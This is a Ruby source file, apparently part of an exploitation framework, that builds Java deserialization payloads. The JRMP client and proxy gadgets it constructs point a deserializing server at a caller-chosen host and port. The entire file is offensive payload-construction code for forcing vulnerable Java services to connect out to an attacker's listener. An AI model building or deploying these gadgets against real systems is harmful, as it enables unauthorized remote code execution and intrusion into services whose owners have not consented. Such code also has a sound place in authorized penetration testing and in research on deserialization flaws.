
require_relative '../serialize'

module Java
  module Serialize
    module Payloads
      module JRMP
        def make_jrmp_client(host, port, objNum)
          objid = JavaObject.new('Ljava/rmi/server/ObjID;', 'space' => JavaObject.new('Ljava/rmi/server/UID;', 'unique' => 0,
                                                                                                               'time' => 0,
                                                                                                               'count' => 0),
                                                            'objNum' => objNum)

          ep = JavaObject.new('Lsun/rmi/transport/tcp/TCPEndpoint;',                                 'host' => host,
                                                                                                     'port' => port.to_i)

          lref = JavaObject.new('Lsun/rmi/transport/LiveRef;', 'ep' => ep,
                                                               'id' => objid,
                                                               'isLocal' => false)

          ur = JavaObject.new('Lsun/rmi/server/UnicastRef2;', 'ref' => lref)

          ur
        end

        module_function :make_jrmp_client

        def make_jrmp_proxy(host, port, objNum)
          invh = JavaObject.new('Ljava/rmi/server/RemoteObjectInvocationHandler;', 'ref' => make_jrmp_client(host, port, objNum))

          JavaProxy.new(['java.rmi.Remote'], invh)
        end

        module_function :make_jrmp_proxy
      end
    end
  end
end
